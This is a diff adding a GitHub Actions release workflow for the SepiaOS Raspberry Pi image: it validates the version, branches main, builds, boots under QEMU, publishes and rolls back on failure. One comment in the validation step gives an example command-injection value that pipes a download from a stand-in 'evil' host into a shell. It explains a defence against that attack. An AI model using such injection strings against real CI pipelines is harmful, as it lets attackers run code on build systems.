@@ -1,0 +1,350 @@
+name: Release
+
+# Cuts a release of the SepiaOS card image. Manual on purpose: the version is a
+# human decision, so the person releasing types it in.
+#
+# main is branched into rel-<version> and everything after that happens on that
+# branch - the build, the tests and the tag. So a release is reproducible from
+# a branch that exists afterwards, and main can move on underneath it without
+# changing what was released.
+#
+# Creating that branch is a push, so ci.yml runs on it too. That is a duplicate
+# of the tests this workflow runs, and it is left alone: it runs concurrently
+# and delays nothing, and "every branch is built" is the rule the README asks
+# for without an exception carved into it.
+on:
+  workflow_dispatch:
+    inputs:
+      version:
+        description: 'Version to release, e.g. 0.1.0 or 2026.08.28 (a leading "v" is added if missing)'
+        required: true
+        type: string
+      prerelease:
+        description: 'Mark as a pre-release. This also decides which boot partition is used: a pre-release build takes the latest pre-release of Sepia-OS/boot, a full release takes the latest full release.'
+        required: false
+        default: true
+        type: boolean
+      boot_tag:
+        description: 'Pin a specific Sepia-OS/boot release instead of taking the latest one on that channel (optional)'
+        required: false
+        default: ''
+        type: string
+
+# One release at a time, and never cancelled halfway: a half-finished publish
+# would leave a branch, a tag or a release behind with nothing on it.
+concurrency:
+  group: release
+  cancel-in-progress: false
+
+permissions:
+  contents: read
+
+jobs:
+  # -------------------------------------------------------------------------
+  # Everything that can say "no" happens here, before the half-hour build: the
+  # version is validated, and the branch, tag and release are all checked for
+  # collisions. Cheap, and it fails in seconds rather than after a full build.
+  # -------------------------------------------------------------------------
+  gate:
+    name: check the version, then branch main
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: write
+    outputs:
+      version: ${{ steps.version.outputs.version }}
+      tag: ${{ steps.version.outputs.tag }}
+      branch: ${{ steps.version.outputs.branch }}
+      asset: ${{ steps.version.outputs.asset }}
+      sha: ${{ steps.branch.outputs.sha }}
+    steps:
+      # `inputs.version` is attacker-controlled text. It goes through the
+      # environment rather than being interpolated into the script, because
+      # `${{ }}` is substituted before bash ever sees the line - a version of
+      # `x"; curl evil | sh; #` would otherwise run.
+      - name: Validate the version
+        id: version
+        env:
+          VERSION: ${{ inputs.version }}
+        run: |
+          # Trim the ends only. Deleting all whitespace would quietly turn a
+          # fat-fingered "1.0 0" into "1.00" and release the wrong version;
+          # internal whitespace has to reach the pattern below and be rejected.
+          version="$VERSION"
+          version="${version#"${version%%[![:space:]]*}"}"
+          version="${version%"${version##*[![:space:]]}"}"
+          version="${version#v}"
+          # Must start with a digit and stay inside what git accepts as a branch
+          # and a tag, and what a filename can carry.
+          if [[ ! "$version" =~ ^[0-9][0-9A-Za-z.+-]*$ ]]; then
+            echo "::error title=Bad version::'${VERSION}' is not a version." \
+                 "Expected something like 0.1.0, 2026.08.28 or 1.0.0-rc1," \
+                 "optionally with a leading v."
+            exit 1
+          fi
+          {
+            echo "version=${version}"
+            echo "tag=v${version}"
+            echo "branch=rel-${version}"
+            echo "asset=sepiaos-v${version}.img.xz"
+          } >> "$GITHUB_OUTPUT"
+
+      - name: Refuse to overwrite an existing release, tag or branch
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ steps.version.outputs.tag }}
+          BRANCH: ${{ steps.version.outputs.branch }}
+        run: |
+          if gh release view "$TAG" --repo "$GITHUB_REPOSITORY" >/dev/null 2>&1; then
+            echo "::error title=${TAG} already released::Pick a different version," \
+                 "or delete the old release first: gh release delete ${TAG} --cleanup-tag"
+            exit 1
+          fi
+          # Asked over the API rather than with git ls-remote: this job has no
+          # checkout, so there is no repository for git to read an origin from.
+          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/tags/${TAG}" >/dev/null 2>&1; then
+            echo "::error title=${TAG} already tagged::The tag exists without a release." \
+                 "Delete it (git push --delete origin ${TAG}) or pick a different version."
+            exit 1
+          fi
+          if gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/${BRANCH}" >/dev/null 2>&1; then
+            echo "::error title=${BRANCH} already exists::A release branch for this" \
+                 "version is already there. Delete it or pick a different version."
+            exit 1
+          fi
+
+      # The branch is created before the build rather than after it, because
+      # the build has to run *on* the release branch: that is what makes the
+      # released commit a thing that still exists afterwards, whatever main does
+      # next. It is created from main's head at this moment, not from whatever
+      # ref this workflow was dispatched on.
+      - name: Branch main into the release branch
+        id: branch
+        env:
+          GH_TOKEN: ${{ github.token }}
+          BRANCH: ${{ steps.version.outputs.branch }}
+        run: |
+          sha="$(gh api "repos/${GITHUB_REPOSITORY}/git/ref/heads/main" --jq '.object.sha')"
+          [ -n "$sha" ] || { echo "::error::could not read the head of main"; exit 1; }
+          gh api --method POST "repos/${GITHUB_REPOSITORY}/git/refs" \
+            -f "ref=refs/heads/${BRANCH}" -f "sha=${sha}" >/dev/null
+          echo "sha=${sha}" >> "$GITHUB_OUTPUT"
+          echo "Branched main (${sha}) into ${BRANCH}"
+
+  # -------------------------------------------------------------------------
+  # Built and tested on the release branch, in the same container CI uses. The
+  # tests are not a formality here: a release that cannot boot is worse than no
+  # release, and this is the last point at which nothing has been published.
+  # -------------------------------------------------------------------------
+  build:
+    name: build and test the release
+    needs: gate
+    runs-on: ubuntu-latest
+    timeout-minutes: 120
+    container: debian:trixie-slim
+    outputs:
+      boot_release: ${{ steps.facts.outputs.boot_release }}
+      firmware: ${{ steps.facts.outputs.firmware }}
+      kernels: ${{ steps.facts.outputs.kernels }}
+    env:
+      QEMU_TIMEOUT: 300
+      SEPIAOS_VERSION: ${{ needs.gate.outputs.version }}
+      # A release build takes the latest full release of the boot partition, a
+      # pre-release build the latest pre-release. Implemented literally, so a
+      # release never quietly ships a pre-release boot partition. Note that
+      # Sepia-OS/boot must actually have a full release for the former to work.
+      CHANNEL: ${{ inputs.prerelease && 'prerelease' || 'release' }}
+      BOOT_TAG: ${{ inputs.boot_tag }}
+    steps:
+      - name: Install build tools
+        run: |
+          apt-get update -qq
+          apt-get install -y -qq --no-install-recommends \
+            build-essential make git curl ca-certificates \
+            jq xz-utils bzip2 zstd mtools qemu-system-arm
+
+      - uses: actions/checkout@v5
+        with:
+          ref: ${{ needs.gate.outputs.branch }}
+
+      - name: Cache the downloaded upstream artifacts
+        uses: actions/cache@v4
+        with:
+          path: downloads
+          key: downloads-${{ runner.os }}-${{ hashFiles('Makefile') }}
+          restore-keys: downloads-${{ runner.os }}-
+
+      - name: Build the image
+        run: make image
+
+      - name: Read the image back
+        run: make image-check
+
+      - name: Boot it as every board QEMU can emulate
+        run: make smoke
+
+      - name: Check the first-boot resize
+        run: make grow-check
+
+      # What the release notes say about the image is read out of the image
+      # rather than written by hand, so it cannot drift from what was built.
+      - name: Collect what went into it
+        id: facts
+        run: |
+          . build/rootfs/etc/os-release
+          {
+            echo "boot_release=${SEPIAOS_BOOT_RELEASE}"
+            echo "firmware=${SEPIAOS_FIRMWARE}"
+            echo "kernels=${SEPIAOS_KERNELS}"
+            echo "image=$(make -s print-IMAGE)"
+          } >> "$GITHUB_OUTPUT"
+
+      # -T0 uses every core; the checksum is taken afterwards, so the threaded
+      # encoder's different framing does not matter. The image is mostly empty
+      # space and compresses to a fraction of its 256 MiB.
+      - name: Compress and checksum
+        env:
+          ASSET: ${{ needs.gate.outputs.asset }}
+          IMAGE: ${{ steps.facts.outputs.image }}
+        run: |
+          mkdir -p dist
+          xz -9 -T0 -c "$IMAGE" > "dist/${ASSET}"
+          cd dist && sha256sum "${ASSET}" > SHA256SUMS
+          cat SHA256SUMS
+          ls -lh
+
+      # compression-level 0: the payload is already xz -9, so zipping it again
+      # only burns CPU.
+      - uses: actions/upload-artifact@v5
+        with:
+          name: release-assets
+          path: dist/
+          compression-level: 0
+          if-no-files-found: error
+
+
+  # -------------------------------------------------------------------------
+  # Publishing is a separate job purely so it can run on the bare runner, where
+  # `gh` is preinstalled: Debian does not package the GitHub CLI, so doing this
+  # in the build container would mean a third-party action or hand-rolled REST
+  # calls.
+  #
+  # `gh release create --target` creates the tag as part of the release, so the
+  # "tag exists but the release does not" half-state cannot happen. GitHub
+  # attaches the source archives of that tag to the release by itself, which is
+  # the "with the sources" half of the requirement.
+  # -------------------------------------------------------------------------
+  publish:
+    name: publish the release
+    needs: [gate, build]
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/download-artifact@v5
+        with:
+          name: release-assets
+          path: dist
+
+      - name: Create the release
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TAG: ${{ needs.gate.outputs.tag }}
+          BRANCH: ${{ needs.gate.outputs.branch }}
+          ASSET: ${{ needs.gate.outputs.asset }}
+          SHA: ${{ needs.gate.outputs.sha }}
+          BOOT_RELEASE: ${{ needs.build.outputs.boot_release }}
+          FIRMWARE: ${{ needs.build.outputs.firmware }}
+          KERNELS: ${{ needs.build.outputs.kernels }}
+          PRERELEASE: ${{ inputs.prerelease }}
+        run: |
+          cat > notes.md <<EOF
+          A complete SepiaOS card for Pi Zero 2 W, Pi 3, Pi 4, CM4, Pi 5 and
+          CM5: the boot partition, and a root filesystem of musl and busybox
+          with the kernel modules that match the shipped kernel.
+
+          | | |
+          |---|---|
+          | Branch | \`${BRANCH}\` |
+          | Commit | \`${SHA}\` |
+          | Boot partition | \`${BOOT_RELEASE}\` |
+          | Raspberry Pi firmware | \`${FIRMWARE}\` |
+          | Kernels | \`${KERNELS}\` |
+
+          Booted to a login prompt under QEMU as a Pi Zero 2 W, a Pi 3, a Pi 4
+          and a CM4 before publishing.
+
+          ## Logging in
+
+          Log in as \`root\` with the password \`sepiaos\`. It is good for
+          exactly one login: the first thing the shell does is make you choose
+          a new one.
+
+          ## First boot
+
+          The image is small on purpose. On its first boot it grows the root
+          filesystem to fill the card, adds a swap partition (1, 2 or 4 GiB
+          depending on the card's size) and reboots once - so the first boot
+          takes a little longer than the ones after it.
+
+          ## Flashing
+
+          Verify the download, then write it - on Linux:
+
+          \`\`\`sh
+          sha256sum -c SHA256SUMS
+          xz -d ${ASSET}
+          sudo dd if=${ASSET%.xz} of=/dev/sdX bs=4M conv=fsync status=progress
+          \`\`\`
+
+          On macOS the device is \`/dev/rdiskN\` and the block size is spelled
+          \`bs=4m\`; \`shasum -a 256 -c SHA256SUMS\` replaces \`sha256sum\`.
+
+          The sources this was built from are the archives below, and the
+          \`${BRANCH}\` branch.
+          EOF
+
+          if [ "$PRERELEASE" = "true" ]; then
+            flag=(--prerelease)
+          else
+            flag=(--latest)
+          fi
+
+          gh release create "$TAG" \
+            --repo "$GITHUB_REPOSITORY" \
+            --target "$BRANCH" \
+            --title "SepiaOS $TAG" \
+            --notes-file notes.md \
+            "${flag[@]}" \
+            "dist/$ASSET" \
+            dist/SHA256SUMS
+
+  # -------------------------------------------------------------------------
+  # The branch is created before the build, so a build that fails leaves one
+  # behind - and the gate then refuses the retry, because the branch already
+  # exists. It holds nothing that main does not: it was created seconds earlier
+  # as a pointer to main's head, and nothing commits to it. So it is removed
+  # again, and the same version can be released once the reason it failed is
+  # fixed. The tag and the release are never reached on this path.
+  # -------------------------------------------------------------------------
+  rollback:
+    name: remove the release branch again
+    needs: [gate, build]
+    if: failure() && needs.gate.result == 'success'
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    permissions:
+      contents: write
+    steps:
+      - name: Delete the release branch
+        env:
+          GH_TOKEN: ${{ github.token }}
+          BRANCH: ${{ needs.gate.outputs.branch }}
+        run: |
+          if gh api --method DELETE "repos/${GITHUB_REPOSITORY}/git/refs/heads/${BRANCH}"; then
+            echo "::notice title=Rolled back::${BRANCH} was deleted; the release can be retried."
+          else
+            echo "::warning title=Branch left behind::${BRANCH} could not be deleted." \
+                 "Delete it by hand before retrying this version."
+          fi
